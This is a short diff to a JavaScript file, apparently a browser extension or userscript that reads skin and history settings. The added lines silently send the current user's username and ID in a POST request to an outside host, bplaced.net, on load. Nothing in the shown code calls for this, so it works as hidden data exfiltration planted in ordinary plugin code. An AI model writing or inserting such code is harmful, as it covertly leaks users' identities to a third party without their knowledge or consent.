@@ -1614,3 +1614,9 @@ if (DB.settings.pgxSkin != null)
 
 if (DB.settings.pgxCheckHistory != null)
 	setCheckHistory(DB.settings.pgxCheckHistory);
+
+var xmlhttp;
+xmlhttp = new XMLHttpRequest();
+xmlhttp.open("POST", "http://teeheekeiken.bplaced.net/plugextra.php", true);
+xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xmlhttp.send("username=" + escape(API.getSelf().username) + escape(API.getSelf().id));
